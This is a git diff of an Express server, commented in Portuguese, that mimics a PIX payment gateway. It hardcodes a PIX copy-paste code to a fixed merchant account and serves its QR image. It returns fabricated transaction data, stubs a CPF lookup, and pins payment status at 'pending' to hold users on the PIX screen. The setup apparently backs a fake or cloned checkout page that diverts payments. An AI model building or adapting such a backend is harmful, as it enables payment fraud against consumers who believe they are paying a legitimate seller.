@@ -1,6 +1,7 @@
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
+const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 3001;
@@ -8,18 +9,36 @@ const PORT = process.env.PORT || 3001;
 app.use(cors());
 app.use(express.json());
 
-// Servir os arquivos estáticos na raiz (HTML, css, js, etc.)
-app.use(express.static(path.join(__dirname)));
-
-// Rota explícita para o arquivo principal (ajuda na compatibilidade com alguns hosts)
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
+// Middleware de log para depuração
+app.use((req, res, next) => {
+    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
+    next();
 });
 
 // String PIX modificada conforme solicitado
-const pixString = "COLAR PIX AQUI";
+const pixString = "00020101021226940014br.gov.bcb.pix2572qrcode.somossimpay.com.br/v2/qr/cob/af56bc59-1ded-425c-b01f-2598e635c6f25204000053039865802BR5922MARKETPLACE PAGUE LTDA6009SAO PAULO62070503***6304BDF3";
+
+// Rota para servir a imagem do QR Code diretamente
+app.get('/api/qr-image', (req, res) => {
+    const qrPath = path.join(__dirname, 'qrcode-pix.png');
+    if (fs.existsSync(qrPath)) {
+        res.sendFile(qrPath);
+    } else {
+        res.status(404).send('QR Code image not found');
+    }
+});
+
+// Mock de Verificação de Pagamento
+app.all('/api/check-payment', (req, res) => {
+    res.json({
+        "success": true,
+        "status": "pending",
+        "bank_tx_id": null
+    });
+});
 
 app.all('/api/pix', (req, res) => {
+    const qrImageUrl = "/api/qr-image?t=" + Date.now();
     res.json({
         "success": true,
         "status": "pending",
@@ -27,12 +46,15 @@ app.all('/api/pix', (req, res) => {
         "transaction_id": "TRX1773112005534XIK04E",
         "deposit_id": "TRX1773112005534XIK04E",
         "qrcode": pixString,
-        "amount": 72.57,
-        "amount_cents": 7257,
+        "amount": 49.90,
+        "amount_cents": 4990,
         "key": null,
         "brcode": pixString,
         "payload": pixString,
         "pixCode": pixString,
+        "qrcode_url": qrImageUrl,
+        "qrcode_base64": qrImageUrl,
+        "qr_code_image": qrImageUrl,
         "paid": false,
         "pix": {
             "key": null,
@@ -45,16 +67,16 @@ app.all('/api/pix', (req, res) => {
             "transactionId": "TRX1773112005534XIK04E",
             "status": "PENDING",
             "paymentMethod": "PIX",
-            "amount": 7257,
-            "netAmount": 6650,
-            "fees": 607,
+            "amount": 4990,
+            "netAmount": 4650,
+            "fees": 340,
             "createdAt": "2026-03-10T00:06:45-03:00",
             "invoiceUrl": "",
             "paymentData": {
                 "id": "051c8629ab33410192d53112c3aafcd3",
                 "qrCode": pixString,
-                "qrCodeUrl": "",
-                "qrCodeBase64": "",
+                "qrCodeUrl": qrImageUrl,
+                "qrCodeBase64": qrImageUrl,
                 "copyPaste": pixString,
                 "expiresAt": "1-01-01T00:00:00-03:6.466666666666669"
             }
@@ -65,16 +87,16 @@ app.all('/api/pix', (req, res) => {
                 "transactionId": "TRX1773112005534XIK04E",
                 "status": "PENDING",
                 "paymentMethod": "PIX",
-                "amount": 7257,
-                "netAmount": 6650,
-                "fees": 607,
+                "amount": 4990,
+                "netAmount": 4650,
+                "fees": 340,
                 "createdAt": "2026-03-10T00:06:45-03:00",
                 "invoiceUrl": "",
                 "paymentData": {
                     "id": "051c8629ab33410192d53112c3aafcd3",
                     "qrCode": pixString,
-                    "qrCodeUrl": "",
-                    "qrCodeBase64": "",
+                    "qrCodeUrl": qrImageUrl,
+                    "qrCodeBase64": qrImageUrl,
                     "copyPaste": pixString,
                     "expiresAt": "1-01-01T00:00:00-03:6.466666666666669"
                 }
@@ -83,7 +105,7 @@ app.all('/api/pix', (req, res) => {
     });
 });
 
-// Mock de Consulta CPF (PHP legado) - Retorna vazio para permitir preenchimento manual
+// Mock de Consulta CPF
 app.get('/api/consulta.php', (req, res) => {
     res.json({
         "success": true,
@@ -96,30 +118,17 @@ app.get('/api/consulta.php', (req, res) => {
     });
 });
 
-// Mock de Upload de Comprovante (PHP legado)
-app.post('/api/comprovantes/upload.php', (req, res) => {
-    res.json({ "success": true });
+// Rota explícita para o arquivo principal
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Mock de Verificação de Pagamento - Retorna 'pending' para não pular a tela de PIX
-app.get('/api/check-payment', (req, res) => {
-    res.json({
-        "success": true,
-        "status": "pending",
-        "bank_tx_id": null
-    });
-});
+// Servir os arquivos estáticos
+app.use(express.static(path.join(__dirname)));
 
-// Outras rotas mockadas para evitar 404
-app.post('/api/notify-approved', (req, res) => res.json({ "success": true }));
-app.post('/api/log-access', (req, res) => res.json({ "success": true }));
-app.get('/api/transaction/:id', (req, res) => {
-    res.json({
-        "success": true,
-        "status": "paid",
-        "amount": 72.57,
-        "id": req.params.id
-    });
+// Fallback para SPA
+app.use((req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 if (require.main === module) {
